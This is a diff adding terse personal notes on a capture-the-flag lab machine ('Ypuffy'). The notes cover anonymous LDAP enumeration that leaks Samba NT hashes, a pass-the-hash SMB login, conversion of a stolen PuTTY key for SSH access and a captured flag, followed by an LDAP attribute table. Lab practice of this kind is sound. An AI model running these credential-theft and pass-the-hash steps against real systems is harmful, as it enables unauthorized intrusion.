@@ -1,0 +1,38 @@
+#10.10.10.107    (OpenBSD machine)
+#PORT- 22, 80, 139(netbios-sssn, samba), 389(ldap, anony. bind OK), 445(netbios-ssn, smb)
+
+#nmap 
+
+#enumerate port 389(LDAP= Lightweight Directory Access Protocol)
+ldapsearch -H ldap://10.10.10.107:389 -x -b "dc=hackthebox,dc=htb"
+#users found with there sambaNTPassword
+
+#connect to alice1978 through smbclient 
+smbclient //10.10.10.107/alice -U alice1978 --pw-nt-hash
+#PASSWD= 0B186E661BBDBDCF6047784DE8B9FD8B        (sambaNTPassword)
+
+#got my_private_key.ppk file...
+#convert .ppk to ssh
+puttygen /root/Documents/hackthebox/9.\ Ypuffy/my_private_key.ppk -O private-openssh -o ssh_key.pem
+
+#connect to ssh
+ssh -i ssh_key.pem alice1978@10.10.10.107
+
+#key
+acbc06eb2982b14c2756b6c6e3767aab
+
+
+--------------------------------------------------------
+https://en.wikipedia.org/wiki/LDAP_Data_Interchange_Format
+------------------------------
+String  X.500 AttributeType
+------------------------------
+CN      commonName
+L       localityName
+ST      stateOrProvinceName
+O       organizationName
+OU      organizationalUnitName
+C       countryName
+STREET  streetAddress
+DC      domainComponent
+UID     userid
